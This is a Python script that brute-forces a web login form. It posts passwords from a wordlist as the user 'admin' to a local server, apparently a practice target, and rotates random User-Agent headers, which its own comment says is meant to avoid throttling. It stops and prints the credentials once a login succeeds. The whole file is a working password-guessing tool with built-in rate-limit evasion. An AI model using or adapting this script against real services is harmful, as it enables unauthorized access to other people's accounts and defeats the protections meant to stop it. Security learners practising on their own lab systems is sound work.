import requests
import random
from itertools import product
import string
import argparse
from random_user_agent.user_agent import UserAgent
from random_user_agent.params import SoftwareName, OperatingSystem
count = 0
software_names = [SoftwareName.CHROME.value]
operating_systems = [OperatingSystem.WINDOWS.value, OperatingSystem.LINUX.value]
user_agent_rotator = UserAgent(software_names=software_names, operating_systems=operating_systems, limit=1000)


hardcoded_user = "admin"
url = "http://127.0.0.1:5000"

#user agent headers
headers = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Cache-Control": "max-age=0",
    "Connection": "keep-alive",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": url,
    "Referer": url,
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
}


with open("wordlist.txt") as f:
    for password in f:
        #removes unnessecary whitespace from passwords
        password = password.strip()
        #rotates headers to prevent throttling
        headers["user-agent"] = user_agent_rotator.get_random_user_agent()
        
        payload = {
        "username": hardcoded_user,
        "password": password
    }
        try:
            count = count+1
            #enters username and password via a post request
            response = requests.post(url, headers=headers, data=payload)
            #code 401 means incorrect login, so if the webpage returns that we keep trying
            if response.status_code == 401:
                
                print("\rIncorrect login ",count," attempts. Tried: ",payload["username"],":",password,end="")
            #code 200 means correct login, so once we've found this the loop breaks
            elif response.status_code == 200:
                print()
                print("Correct login found in ",count, "attempts: ",payload["username"],":",password)
                break
            

            #print(response.status_code)
            
        except Exception as e:
            print(e)